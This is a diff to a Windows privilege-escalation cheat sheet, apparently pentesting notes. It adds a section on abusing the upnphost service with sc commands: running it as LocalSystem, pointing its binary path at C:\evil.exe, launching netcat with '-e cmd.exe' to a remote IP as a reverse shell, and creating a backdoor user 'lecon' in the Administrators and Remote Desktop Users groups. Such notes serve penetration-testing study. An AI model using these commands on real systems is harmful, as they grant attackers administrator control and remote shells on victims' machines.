@@ -610,6 +610,7 @@ net start SSDPSRV
 net start upnphost
 ```
 
+
 #### Unquoted Service Paths - race condition
 
 ```
@@ -628,6 +629,23 @@ sc qc upnphost
 Get-WmiObject win32_service | select Name, DisplayName, State, PathName | Out-File
 dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
 ```
+
+# Service Modification Summary
+```
+sc qc upnphost
+sc stop upnphost
+sc config upnphost obj= ".\LocalSystem" password= ""
+```
+#### Binary Execution method
+```sc config upnphost binpath= “C:\evil.exe”```
+#### Netcat method
+```sc config upnphost binpath= “\“C:\nc.exe\” \”-nv 10.11.0.185 443 -e C:\windows\system32\cmd.exe\””```
+
+#### User Add method
+```sc config upnphost binpath= “net user lecon lecon /add”```
+```sc config upnphost binpath= “net localgroup Administrators lecon /add”```
+```sc config upnphost binpath= “net localgroup “/Remote Desktop Users/” lecon /add”```
+
 
 #### Always Install Elevated
 ```
